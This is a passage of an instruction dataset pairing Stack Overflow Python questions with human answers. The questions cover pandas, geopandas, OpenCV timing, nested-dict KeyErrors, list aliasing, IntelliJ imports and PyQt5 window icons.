0.10.\n--&gt; 164     self[&quot;geometry&quot;] = _ensure_geometry(self[&quot;geometry&quot;].values, crs)\n    165 except TypeError:\n    166     pass\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/geopandas\/geodataframe.py:46, in _ensure_geometry(data, crs)\n     44     return GeoSeries(out, index=data.index, name=data.name)\n     45 else:\n---&gt; 46     out = from_shapely(data, crs=crs)\n     47     return out\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/geopandas\/array.py:151, in from_shapely(data, crs)\n    135 def from_shapely(data, crs=None):\n    136     &quot;&quot;&quot;\n    137     Convert a list or array of shapely objects to a GeometryArray.\n    138 \n   (...)\n    149 \n    150     &quot;&quot;&quot;\n--&gt; 151     return GeometryArray(vectorized.from_shapely(data), crs=crs)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/geopandas\/array.py:280, in GeometryArray.__init__(self, data, crs)\n    275     raise TypeError(\n    276         &quot;'data' should be array of geometry objects. Use from_shapely, &quot;\n    277         &quot;from_wkb, from_wkt functions to construct a GeometryArray.&quot;\n    278     )\n    279 elif not data.ndim == 1:\n--&gt; 280     raise ValueError(\n    281         &quot;'data' should be a 1-dimensional array of geometry objects.&quot;\n    282     )\n    283 self.data = data\n    285 self._crs = None\n\nValueError: 'data' should be a 1-dimensional array of geometry objects.\n<\/code><\/pre>\n<pre><code>pandas: 1.4.1\ngeopandas: 0.10.2\nosmnx: 1.1.2\n<\/code><\/pre>","output_text":"<ul>\n<li>have changed this to a MWE<\/li>\n<li>have separated out <code>join()<\/code> and <code>groupby()<\/code> \/ <code>agg()<\/code><\/li>\n<li>have included versions<\/li>\n<li>one difference I can see - <strong>python<\/strong> 3.9 vs 3.10<\/li>\n<\/ul>\n<pre><code>import osmnx as ox\nimport geopandas as gpd\nimport pandas as pd\nimport io\n\ndf = pd.read_csv(\n    io.StringIO(\n        &quot;&quot;&quot;AccidentUID,AccidentLocation_CHLV95_E,AccidentLocation_CHLV95_N\n99BA5D383B96D02AE0430A865E33D02A,2663985,1213215\n9B25C4871C909022E0430A865E339022,2666153,1211303\n9B71AB601D948092E0430A865E338092,2666168,1211785\n9C985CF7710A60C0E0430A865E3360C0,2663991,1213203\n9EA9548660AB3002E0430A865E333002,2666231,1210786\n9B2E8B25D5C29094E0430A865E339094,2666728,1210404\n9C87C10FB73A905EE0430A865E33905E,2666220,1211811\n9E30F39D35CA1058E0430A865E331058,2664599,1212960\n9BC2EA43E0BFC068E0430A865E33C068,2665533,1212617\n9C0BB9332AB30044E0430A865E330044,2666852,1211964&quot;&quot;&quot;\n    )\n)\n\ngdf_loc = gpd.GeoDataFrame(\n    data=df,\n    geometry=gpd.points_from_xy(\n        df[&quot;AccidentLocation_CHLV95_E&quot;], df[&quot;AccidentLocation_CHLV95_N&quot;]\n    ),\n    crs=&quot;EPSG:2056&quot;,\n).to_crs(&quot;epsg:4326&quot;)\n\n# get OSM data for investigated location\nG = ox.graph_from_place(&quot;Luzern, Switzerland&quot;, network_type=&quot;drive&quot;)\nG_proj = ox.project_graph(G)\ngdf_nodes, gdf_edges = ox.utils_graph.graph_to_gdfs(G_proj)\n\n# project graph and points\ngdf_loc_p = gdf_loc[&quot;geometry&quot;].to_crs(G_proj.graph[&quot;crs&quot;])\n\nne, d = ox.nearest_edges(\n    G_proj, X=gdf_loc_p.x.values, Y=gdf_loc_p.y.values, return_dist=True\n)\n\n# reindex points based on results from nearest_edges\ngdf_loc = (\n    gdf_loc.set_index(pd.MultiIndex.from_tuples(ne, names=[&quot;u&quot;, &quot;v&quot;, &quot;key&quot;]))\n    .assign(distance=d)\n    .sort_index()\n)\n\n# join geometry from edges back to points\ngdf_bad_roads = gdf_edges.join(gdf_loc, rsuffix=&quot;_loc&quot;, how=&quot;inner&quot;)\n# aggregate so have number of accidents on each edge\ngdf_bad_roads_agg = gdf_bad_roads.groupby([&quot;u&quot;, &quot;v&quot;, &quot;key&quot;]).agg(\n    geometry=(&quot;geometry&quot;, &quot;first&quot;), number=(&quot;osmid&quot;, &quot;size&quot;)\n).set_crs(gdf_edges.crs)\n\nprint(f&quot;&quot;&quot;\npandas: {pd.__version__}\ngeopandas: {gpd.__version__}\nosmnx: {ox.__version__}&quot;&quot;&quot;)\n<\/code><\/pre>\n<pre><code>pandas: 1.4.0\ngeopandas: 0.10.2\nosmnx: 1.1.2\n<\/code><\/pre>\n<p>Alternative aggregate syntax.  Has been confirmed both work<\/p>\n<ul>\n<li>hence conclusion is that <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/user_guide\/groupby.html#named-aggregation\" rel=\"nofollow noreferrer\">named aggregations<\/a> are failing. Possibly should be raised as an issue on <strong>pandas<\/strong>, but is not failing on all environments<\/li>\n<li><code>groupby()<\/code>\/<code>apply()<\/code> is doing a <strong>first<\/strong> on shared edges and also necessary to set CRS again<\/li>\n<li><code>dissolve()<\/code> is doing a <strong>unary union<\/strong> on geometries.  Conceptually should be the same, but is giving slightly different geometry. (A unary union of identical geometries IMHO is an instance of one of the geometries)<\/li>\n<\/ul>\n<pre><code>gdf_bad_roads.groupby([&quot;u&quot;, &quot;v&quot;, &quot;key&quot;]).agg({&quot;geometry&quot;:&quot;first&quot;, &quot;AccidentUID&quot;:&quot;size&quot;}).set_crs(gdf_edges.crs).explore(color=&quot;blue&quot;)\n\n\ngdf_bad_roads.dissolve([&quot;u&quot;, &quot;v&quot;, &quot;key&quot;], aggfunc={&quot;AccidentUID&quot;:&quot;size&quot;}).explore(color=&quot;blue&quot;)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to avoid KeyError from missing dict keys?<p>I'm running a script that makes GET requests in a loop. I test for a successful response, then convert the response to a json object and do stuff. My code looks like this:<\/p>\n<pre><code>response = requests.get(url=url)\nif response.status_code == 200:\n    response_json = response.json()\n    &lt;do stuff&gt;\nelse:\n    &lt;handle error&gt;\n<\/code><\/pre>\n<p>Sometimes I get a successful response, but for whatever reason the dict comes back with some missing data and my script breaks from a <code>KeyError<\/code>. I want to make a bulletproof test to avoid errors and retrieve the value of <code>'high'<\/code> and <code>'low'<\/code> for <code>response_json['Data']['Data'][1]<\/code>. The structure of the dict is:<\/p>\n<pre><code>{'Data': {'Aggregated': False,\n          'Data': [{'close': 0.8062,\n                    'conversionType': 'multiply',\n                    'high': 0.8084,\n                    'low': 0.788,\n                    'open': 0.8102,\n                    'time': 1428465600,\n                    'volumefrom': 145.38,\n                    'volumeto': 117.2},\n                   {'close': 0.8,\n                    'conversionType': 'multiply',\n                    'high': 0.8101,\n                    'low': 0.8,\n                    'open': 0.8062,\n                    'time': 1428469200,\n                    'volumefrom': 262.39,\n                    'volumeto': 209.92}],\n          'TimeFrom': 1428465600,\n          'TimeTo': 1428469200},\n 'HasWarning': False,\n 'Message': '',\n 'RateLimit': {},\n 'Response': 'Success',\n 'Type': 100}\n<\/code><\/pre>\n<p>And my current best attempt at a test is:<\/p>\n<pre><code>if 'Data' in response_json:\n    if 'Data' in 'Data':\n        if len(response_json['Data']['Data']) &gt; 1:\n            if 'low' and 'high' in response_json['Data']['Data'][1]:\n                if 'low' != None and 'high' != None:\n                    &lt;do stuff&gt;    \nelse:\n    print(&quot;Error:&quot;, url)\n<\/code><\/pre>\n<p>I believe this covers all bases, but it seems unwieldy. Is there a better way to test for the presence of keys and valid values in this situation, and\/or to keep my script running without breaking?<\/p>\n<p>Also wondering if I need an <code>else<\/code> statement after every nested conditional test, or if Python will default to the <code>else<\/code> at the bottom if one of the conditions comes back <code>False<\/code>?<\/p>","output_text":"<p>I could not find any XPath type way to find a key in json so the stacked <code>if<\/code> statements are needed.<\/p>\n<p>You need to fix your syntax to get correct values.<\/p>\n<p>Try this code:<\/p>\n<pre><code>response_json = {'Data': {'Aggregated': False,\n          'Data': [{'close': 0.8062,\n                    'conversionType': 'multiply',\n                    'high': 0.8084,\n                    'low': 0.788,\n                    'open': 0.8102,\n                    'time': 1428465600,\n                    'volumefrom': 145.38,\n                    'volumeto': 117.2},\n                   {'close': 0.8,\n                    'conversionType': 'multiply',\n                    'high': 0.8101,\n                    'low': 0.8,\n                    'open': 0.8062,\n                    'time': 1428469200,\n                    'volumefrom': 262.39,\n                    'volumeto': 209.92}],\n          'TimeFrom': 1428465600,\n          'TimeTo': 1428469200},\n 'HasWarning': False,\n 'Message': '',\n 'RateLimit': {},\n 'Response': 'Success',\n 'Type': 100}\n\n\nlow = high = None  # default values\nif 'Data' in response_json.keys():\n    if 'Data' in response_json['Data'].keys():\n        if len(response_json['Data']['Data']) &gt; 1:\n            if 'low' in response_json['Data']['Data'][1]:\n               if 'high' in response_json['Data']['Data'][1]:\n                  if response_json['Data']['Data'][1]['low'] and response_json['Data']['Data'][1]['high']:\n                        low  = response_json['Data']['Data'][1]['low']\n                        high = response_json['Data']['Data'][1]['high']\n\nif low and high:   # actually only need to check one                      \n   print('&lt;do stuff&gt;', 'low', response_json['Data']['Data'][1]['low'])\n   print('&lt;do stuff&gt;', 'high', response_json['Data']['Data'][1]['high'])\nelse:\n   print(&quot;High\\Low not found&quot;)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n why execute time is less when I set the useOptimized false<p>python: 3.8.0\nopenCV: 4.2.0\nenvironment: pyCharm<\/p>\n\n<p>When I setUseOptimized false, the execute time is less than when it's true. Why? It should be slower. What happened?\nThis is my code and output.<\/p>\n\n<pre><code>import cv2\n\nprint(cv2.useOptimized())\n\nimg = cv2.imread('images\/ship.bmp')\n\ne1 = cv2.getTickCount()\nres = cv2.medianBlur(img, 49)\ne2 = cv2.getTickCount()\nprint((e2 - e1) \/ cv2.getTickFrequency())\n\ncv2.setUseOptimized(False)\nprint(cv2.useOptimized())\ne1 = cv2.getTickCount()\nres = cv2.medianBlur(img, 49)\ne2 = cv2.getTickCount()\nprint((e2 - e1) \/ cv2.getTickFrequency())\n<\/code><\/pre>\n\n<pre><code>True\n0.000351\nFalse\n0.0002813\n<\/code><\/pre>","output_text":"<p>From the openCV docs <a href=\"https:\/\/docs.opencv.org\/2.4\/modules\/core\/doc\/utility_and_system_functions_and_macros.html#setuseoptimized\" rel=\"nofollow noreferrer\">here<\/a> there are a few reasons that you could be observing such a result<\/p>\n\n<ol>\n<li>Your platform doesn't support any optimisation code (such as SSE, AVX)<\/li>\n<li>The operation you're performing doesn't include optimisation code.<\/li>\n<li>The operation you're performing does not expose the benefit of optimisation. I.e. performing a single medianBlur is a relatively simple task that doesn't consume too many resources.<\/li>\n<li>You haven't repeated the testing enough to get a reliable result.<\/li>\n<li>The system you're executing the script on is running other processes that are skewing the results.<\/li>\n<\/ol>\n\n<p>On my machine, I ran the following:<\/p>\n\n<pre><code>import cv2\nfrom enum import Enum\n\n\nclass CPUFeatures(Enum):\n    CPU_MMX = 1\n    CPU_SSE = 2\n    CPU_SSE2 = 3\n    CPU_SSE3 = 4\n    CPU_SSSE3 = 5\n    CPU_SSE4_1 = 6\n    CPU_SSE4_2 = 7\n    CPU_POPCNT = 8\n    CPU_FP16 = 9\n    CPU_AVX = 10\n    CPU_AVX2 = 11\n    CPU_FMA3 = 12\n    CPU_AVX_512F = 13\n    CPU_AVX_512BW = 14\n    CPU_AVX_512CD = 15\n    CPU_AVX_512DQ = 16\n    CPU_AVX_512ER = 17\n    CPU_AVX_512IFMA512 = 18\n    CPU_AVX_512IFMA = 18\n    CPU_AVX_512PF = 19\n    CPU_AVX_512VBMI = 20\n    CPU_AVX_512VL = 21\n    CPU_AVX_512VBMI2 = 22\n    CPU_AVX_512VNNI = 23\n    CPU_AVX_512BITALG = 24\n    CPU_AVX_512VPOPCNTDQ = 25\n    CPU_AVX_5124VNNIW = 26\n    CPU_AVX_5124FMAPS = 27\n    CPU_NEON = 100\n    CPU_MSA = 150\n    CPU_VSX = 200\n    CPU_VSX3 = 201\n    CPU_AVX512_SKX = 256\n    CPU_AVX512_COMMON = 257\n    CPU_AVX512_KNL = 258\n    CPU_AVX512_KNM = 259\n    CPU_AVX512_CNL = 260\n    CPU_AVX512_CLX = 261\n    CPU_AVX512_ICL = 262\n    CPU_MAX_FEATURE = 512\n\n\ndef run_optimised(img, repeat):\n    cv2.setUseOptimized(True)\n    start = cv2.getTickCount()\n    for i in range(repeat):\n        cv2.medianBlur(img, 49)\n    # Get performance count\n    time = (cv2.getTickCount() - start) \/ cv2.getTickFrequency()\n    return time\n\n\ndef run_non_optimised(img, repeat):\n    cv2.setUseOptimized(False)\n    start = cv2.getTickCount()\n    for i in range(repeat):\n        cv2.medianBlur(img, 49)\n    # Get performance count\n    time = (cv2.getTickCount() - start) \/ cv2.getTickFrequency()\n    return time\n\n\nif __name__ == \"__main__\":\n\n    print(\"Supported CPU features\")\n    for cpu_feature in CPUFeatures:\n        supported = cv2.checkHardwareSupport(int(cpu_feature.value))\n        print(\"{} is {} supported\".format(cpu_feature, \"\" if supported else \"not\"))\n\n    print(\"\\nRunning tests\\n\")\n    img = cv2.imread('C:\/tiger.jpg')\n\n    repeats = 3\n    iterations = 100\n    total_optimised = 0\n    total_non_optimised = 0\n    for i in range(repeats):\n        print(\"Test # {}\".format(i))\n        optimised = run_optimised(img, iterations)\n        non_optimised = run_non_optimised(img, iterations)\n        print(\"Optimised: {}\".format(optimised))\n        print(\"Non-optimised: {}\".format(non_optimised))\n        total_optimised += optimised\n        total_non_optimised += non_optimised\n\n    print(\"Final - optimised: {}\".format(optimised))\n    print(\"Final - non-optimised: {}\".format(non_optimised))=\n<\/code><\/pre>\n\n<p>Which produced the following output:<\/p>\n\n<pre><code>&gt;python test.py\nSupported CPU features\nCPUFeatures.CPU_MMX is  supported\nCPUFeatures.CPU_SSE is  supported\nCPUFeatures.CPU_SSE2 is  supported\nCPUFeatures.CPU_SSE3 is  supported\nCPUFeatures.CPU_SSSE3 is  supported\nCPUFeatures.CPU_SSE4_1 is  supported\nCPUFeatures.CPU_SSE4_2 is  supported\nCPUFeatures.CPU_POPCNT is  supported\nCPUFeatures.CPU_FP16 is  supported\nCPUFeatures.CPU_AVX is  supported\nCPUFeatures.CPU_AVX2 is  supported\nCPUFeatures.CPU_FMA3 is  supported\nCPUFeatures.CPU_AVX_512F is not supported\nCPUFeatures.CPU_AVX_512BW is not supported\nCPUFeatures.CPU_AVX_512CD is not supported\nCPUFeatures.CPU_AVX_512DQ is not supported\nCPUFeatures.CPU_AVX_512ER is not supported\nCPUFeatures.CPU_AVX_512IFMA512 is not supported\nCPUFeatures.CPU_AVX_512PF is not supported\nCPUFeatures.CPU_AVX_512VBMI is not supported\nCPUFeatures.CPU_AVX_512VL is not supported\nCPUFeatures.CPU_AVX_512VBMI2 is not supported\nCPUFeatures.CPU_AVX_512VNNI is not supported\nCPUFeatures.CPU_AVX_512BITALG is not supported\nCPUFeatures.CPU_AVX_512VPOPCNTDQ is not supported\nCPUFeatures.CPU_AVX_5124VNNIW is not supported\nCPUFeatures.CPU_AVX_5124FMAPS is not supported\nCPUFeatures.CPU_NEON is not supported\nCPUFeatures.CPU_MSA is not supported\nCPUFeatures.CPU_VSX is not supported\nCPUFeatures.CPU_VSX3 is not supported\nCPUFeatures.CPU_AVX512_SKX is not supported\nCPUFeatures.CPU_AVX512_COMMON is not supported\nCPUFeatures.CPU_AVX512_KNL is not supported\nCPUFeatures.CPU_AVX512_KNM is not supported\nCPUFeatures.CPU_AVX512_CNL is not supported\nCPUFeatures.CPU_AVX512_CLX is not supported\nCPUFeatures.CPU_AVX512_ICL is not supported\nCPUFeatures.CPU_MAX_FEATURE is not supported\n\nRunning tests\n\nTest # 0\nOptimised: 2.210887199547867\nNon-optimised: 2.659088088298851\nTest # 1\nOptimised: 2.2174625162069614\nNon-optimised: 2.341818393377586\nTest # 2\nOptimised: 2.235847859572912\nNon-optimised: 2.352969891067055\nFinal - optimised: 6.664197575327741\nFinal - non-optimised: 7.353876372743493\n\nProcess finished with exit code 0\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Count groups of consecutive negative numbers in a Pandas column<p>I have a Pandas data frame as mentioned below:<\/p>\n<pre><code>sr_no  amount_credit_debit\n  1     1000\n  2     1234\n  3    -2378\n  4    -1290\n  5     3000\n  6    -4567\n  8     5678\n  9     1390\n  10   -2346\n  11   -2876\n  12   -9065\n  13   -6743\n<\/code><\/pre>\n<p>I have to count groups of consecutive negative numbers in above df.<\/p>\n<pre><code>(-2378 and -1290) = First negative instance\n(-4567) = Second negative instance\n(-2346,-2876,-9065,-6743) = Third negative instance\n<\/code><\/pre>\n<p>output is <code>3<\/code> which is my answer.<br\/>\nI have tried a lot but cannot get right answer<\/p>","output_text":"<p>First, you can find group numbers for negative values:<\/p>\n<pre><code>m = df['amount_credit_debit'].lt(0)\n(m != m.shift())[m].cumsum()\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>2     1\n3     1\n5     2\n8     3\n9     3\n10    3\n11    3\n<\/code><\/pre>\n<p>And then find the max group number:<\/p>\n<pre><code>(m != m.shift())[m].cumsum().max()\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>3\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Copy warning when filtering dataframe in pandas<p>I have a list of cars and their prices. I need to apply log transformation on the prices, but some prices are set to 0, so I first need to create a copy of my original df with the prices filtered out:<\/p>\n\n<pre><code>import pandas as pd\nimport numpy as np\n\ncars = {'Brand': ['Honda Civic','Toyota Corolla','Ford Focus','Audi A4'],\n        'Price': [22000,25000,27000,35000]\n        }\n\ndf = pd.DataFrame(cars, columns = ['Brand', 'Price'])\n\nprint (df)\n\ndf2 = df.loc[(df.Price&gt;=22000) &amp; (df.Brand=='Honda Civic')]\n\nprint(df2)\n\ndf2['logprice']=np.log(df2['Price'])\n<\/code><\/pre>\n\n<p>I get the warning <\/p>\n\n<pre><code>A value is trying to be set on a copy of a slice from a DataFrame.\nTry using .loc[row_indexer,col_indexer] = value instead\n<\/code><\/pre>\n\n<p>But I'm already using <code>.loc<\/code> !<\/p>\n\n<p>I've read everything about this warning but I still don't understand what I'm doing wrong...<\/p>","output_text":"<p>In order to make sure no warning add <code>copy<\/code><\/p>\n\n<pre><code>df2 = df.loc[(df.Price&gt;=22000) &amp; (df.Brand=='Honda Civic')].copy()\ndf2['logprice']=np.log(df2['Price'])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why is sys.stdout.write outputs unexpected characters?<pre><code>from sys import stdin, stdout\ntemp=1\nstdout.write(str(temp))\n<\/code><\/pre>\n\n<p>I am expecting output to be 1 but it is 11 . Why?<\/p>","output_text":"<pre>\n>>> import sys\n>>> help(sys.stdout.write)\n\nHelp on built-in function write:\n\nwrite(text, \/) method of _io.TextIOWrapper instance\n    Write string to stream.\n    Returns the number of characters written (which is always equal to\n    the length of the string)\n<\/pre>\n\n<p>The first <code>\"1\"<\/code> is the argument that you give to <code>write<\/code> and the second <code>\"1\"<\/code> is length of your string returned by <code>write<\/code>. <\/p>\n\n<pre>\n>>> sys.stdout.write(\"Hello\")\nHello5\n<\/pre>\n\n<p>Note that the return value appears in the output because this is an interactive session. If you run this code from a <code>.py<\/code> file, you would only see <code>\"Hello\"<\/code>, as you expected.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python, Pandas: What it is the best way to separate string into several columns?<p>I want to split one string into several columns however I encounter issue with <code>str.split<\/code> method.<\/p>\n<p>Example:\nWhile performing <code>str.split<\/code> on column <code>Name<\/code> which consist such strings it work as expected.<\/p>\n<pre><code>data1 = {'Name': ['Alice 23', 'Philip 12', 'Krish 64', 'John 29']}\ndf1 = pd.DataFrame(data1)\ndf1\n    Name\n0   Alice 23\n1   Philip 12\n2   Krish 64\n3   John 29\n<\/code><\/pre>\n<p>performing split:<\/p>\n<pre><code>df1[['Name', 'age']] = df1['Name'].str.split(' ', 1, expand=True)\ndf1\n\nName    age\n0   Alice   23\n1   Philip  12\n2   Krish   64\n3   John    29\n\n<\/code><\/pre>\n<p>All good, as I wanted but if I need to place other separator like <code>||<\/code> its not working properly.<\/p>\n<pre><code>data2 = {'Name': ['Alice||23', 'Philip||12', 'Krish||64', 'John||29']}\ndf2 = pd.DataFrame(data)\ndf2\n\n    Name\n0   Alice||23\n1   Philip||12\n2   Krish||64\n3   John||29\n<\/code><\/pre>\n<p>performing split...<\/p>\n<pre><code>df2[['Name', 'age']] = df2['Name'].str.split('[||]',1,expand = True)\ndf3[['Name', 'age']] = df2['Name'].str.split('||',1,expand = True)\n<\/code><\/pre>\n<p>results in not what I expected<\/p>\n<pre><code>df2\n    Name    age\n0   Alice   |23\n1   Philip  |12\n2   Krish   |64\n3   John    |29\n\ndf3\n\nName    age\n0       Alice||23\n1       Philip||12\n2       Krish||64\n3       John||29\n<\/code><\/pre>\n<p>What's the reason for this behaviour and how get expected result which is as <code>df1<\/code>?<\/p>","output_text":"<p>The issue you're hitting is that <code>pandas<\/code> defaults to assuming your string to split on is a regular expression. In regular expressions the <code>&quot;|&quot;<\/code> character is a special character that enables you to match either expression on the left or right of that character (e.g. you can match 'a' or 'b' with the expression <code>'(a|b)'<\/code>.<\/p>\n<p>In your case, we don't want to pass a regular expression, so you can pass <code>.str.split(\u2026, regex=False)<\/code>.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; df2['Name'].str.split('||', regex=False, expand=True)\n        0   1\n0   Alice  23\n1  Philip  12\n2   Krish  64\n3    John  29\n\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Create new column based on previous column<p>I have a data frame similar to this (with additional columns):<\/p>\n\n<pre><code>srcmacaddr          dstmacaddr\n00-11-2a-3b-4c-5d   22-33-6e-7f-8g-9h       \n22-33-6e-7f-8g-9h   00-11-2a-3b-4c-5d       \n00-11-2a-3b-4c-5d   00-99-5d-4c-3b-2a         \n00-99-5d-4c-3b-2a   22-33-6e-7f-8g-9h\n<\/code><\/pre>\n\n<p>I want to loop over each cell to input a request:<\/p>\n\n<pre><code>MAC_URL = 'http:\/\/macvendors.co\/api\/%s'.format()\nr = requests.get(MAC_URL % '00-11-2a-3b-4c-5d')\nr.json()\n<\/code><\/pre>\n\n<p><strong><em>(I can only do one at a time, from my experience)<\/em><\/strong><\/p>\n\n<p>This returns a JSON object:<\/p>\n\n<pre><code>{'result': {'company': 'Not-4-Real',\n  'mac_prefix': '00:00:A1',\n  'address': '33 NONE OF YOUR BIS AVENUE,,,US',\n  'start_hex': '0000A1000000',\n  'end_hex': '0000A1AAAAAA',\n  'country': 'US',\n  'type': 'MA-L'}}\n<\/code><\/pre>\n\n<p>I need to extract the <code>'company'<\/code> and add it into a new column in the data frame:<\/p>\n\n<pre><code>srcmacaddr          srcCompany   dstmacaddr\n00-11-2a-3b-4c-5d   Not-4-Real   22-33-6e-7f-8g-9h       \n22-33-6e-7f-8g-9h   FICTITIOUS   00-11-2a-3b-4c-5d       \n00-11-2a-3b-4c-5d   Not-4-Real   00-99-5d-4c-3b-2a         \n00-99-5d-4c-3b-2a   SOMETHING    22-33-6e-7f-8g-9h\n<\/code><\/pre>\n\n<p>If possible I would want to do both <code>src &amp; dst<\/code> in the same loop.<\/p>","output_text":"<p>This worked for me,<\/p>\n\n<pre><code>import requests \n# Get mac address from df (src and dst)\n# Load into a list\n# Do request for each mac address\n# Pull out company's name\n# Add last 3 of mac address to the company name to make unique\n#store output in a list\n\n\ndef mac2playa(df):\n    macaddy = [*df['srcmacaddr'], *df['dstmacaddr']]\n    macaddy = pd.unique(macaddy).tolist()\n\n    maccomp = []\n\n    MAC_URL = 'http:\/\/macvendors.co\/api\/%s'.format()\n\n    for i in macaddy: \n        j = requests.get(MAC_URL % i).json()\n        j = pd.DataFrame(j['result'].items())\n        j = j.iloc[0][1]\n        j = j + '(' + i[-8:] + ')'\n        maccomp.append(j)\n\n    rename_dict = dict(zip(macaddy, maccomp))\n    return rename_dict\n\n# create variable to store dict output\nrename_dict = mac2playa(dfModbus)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python list updaitng even when condition evaluates to False<p>Why is the longest_palindrome variable updated when the isPalindrome() function evaluates to False? The if\/else condition is not behaving as I would expect.<\/p>\n<pre><code>def palindromeCutting(s):\n    if s == &quot;&quot;:\n        return &quot;&quot;\n\n    letters = list(s)\n\n    while len(letters) &gt; 0:\n        tmp = []\n        longest_palindrome = []\n    \n        for i in range(len(letters)):\n            tmp.append(letters[i])\n\n            if isPalindrome(tmp):\n                print(&quot;updating longest with tmp&quot;)\n                longest_palindrome = tmp\n            print(&quot;longest_palindrome:&quot;,longest_palindrome)\n\n        if len(longest_palindrome) &gt; 1:\n            l = len(longest_palindrome)\n            letters = letters[l:]\n        else:\n            return &quot;&quot;.join(letters)\n\ndef isPalindrome(arr):\n    left, right = 0, len(arr) - 1\n\n    while left &lt;= right:\n        if arr[left] != arr[right]:\n            return False\n        left += 1\n        right -= 1\n\n    return True\n<\/code><\/pre>\n<p>The output for this when run with s = &quot;aaacodedoc&quot; is:<\/p>\n<pre><code>longest_palindrome: ['a']\nlongest_palindrome: ['a', 'a']\nlongest_palindrome: ['a', 'a', 'a']\nlongest_palindrome: ['a', 'a', 'a', 'c']\nlongest_palindrome: ['a', 'a', 'a', 'c', 'o']\nlongest_palindrome: ['a', 'a', 'a', 'c', 'o', 'd']\nlongest_palindrome: ['a', 'a', 'a', 'c', 'o', 'd', 'e']\nlongest_palindrome: ['a', 'a', 'a', 'c', 'o', 'd', 'e', 'd']\nlongest_palindrome: ['a', 'a', 'a', 'c', 'o', 'd', 'e', 'd', 'o']\nlongest_palindrome: ['a', 'a', 'a', 'c', 'o', 'd', 'e', 'd', 'o', 'c']\n<\/code><\/pre>","output_text":"<p>The problem is that you are setting <code>longest_palindrom<\/code> to <code>tmp<\/code>. From that point on, <code>tmp<\/code> and <code>longest_palindrom<\/code> are pointing to the same object. Whenever <code>tmp<\/code> is modified, the modification is reflected on <code>longest_palindrom<\/code>, and vice-versa.<\/p>\n<p>To avoid that, you could instead set <code>longest_palindrom<\/code> to a <em>copy<\/em> of <code>tmp<\/code>, replacing the line<\/p>\n<pre><code>longest_palindrom = tmp\n<\/code><\/pre>\n<p>by<\/p>\n<pre><code>longest_palindrom = tmp[:]\n<\/code><\/pre>\n<p>which sets longest_palindrom to a <em>new<\/em> list containing the elements of <code>tmp<\/code>.<\/p>\n<p>If you want a more in-depth explanation of list aliasing, the answers to <a href=\"https:\/\/stackoverflow.com\/questions\/2612802\/list-changes-unexpectedly-after-assignment-why-is-this-and-how-can-i-prevent-it\">this question<\/a> explain it very well.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Trouble with Intelij IDEA importing classes, \"cannot find reference\" but code still works - Python<p>I am having problems with Intelij IDEA (community edition 2019.3.3 with the latest updates). When I ty to import a class from a different .py file that I have made, it is red underlined and says \"cannot find reference\". The code still works fine but it is really annoying it doesnt give me options when I start typing .lives or .name etc<\/p>\n\n<p>I have tried invalidate caches \/ restart but after it finishes indexing the problem is back, how could I sort this?<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/Jt4dp.jpg\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Jt4dp.jpg\" alt=\"enter image description here\"><\/a><\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/5d3lJ.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/5d3lJ.png\" alt=\"folder hierarchy screen shot\"><\/a><\/p>\n\n<pre><code>class Player:\ndef __init__(self, name):\n    self.name = name\n    self._lives = 3\n    self._level = 1\n    self._score = 0\n<\/code><\/pre>\n\n<hr>\n\n<p>Main <\/p>\n\n<pre><code>from player import Player\n\nkev = Player(\"Kevin\")\nprint(kev.name)\n<\/code><\/pre>","output_text":"<p>Solution: mark the 'Game' directory as a sources root (right-click on the folder > <strong>Mark Directory as<\/strong> > <strong>Sources Root<\/strong>). It should be colored blue. <\/p>\n\n<p>More on content roots in IDEA: <a href=\"https:\/\/jetbrains.com\/help\/idea\/content-roots.html\" rel=\"nofollow noreferrer\">https:\/\/jetbrains.com\/help\/idea\/content-roots.html<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to remove the window icon in PyQt5?<p>How can I remove this icon from the window in PyQt5?\n<img src=\"https:\/\/i.stack.imgur.com\/Lxr6h.png\" alt=\"icon\"><\/p>","output_text":"<p>You can do this easily <\/p>\n\n<pre><code>self.setWindowIcon(QIcon(\"c:\/1.png\"))\n<\/code><\/pre>\n\n<p>and copy transparent icon to c: drive as '1.png'<\/p>"}
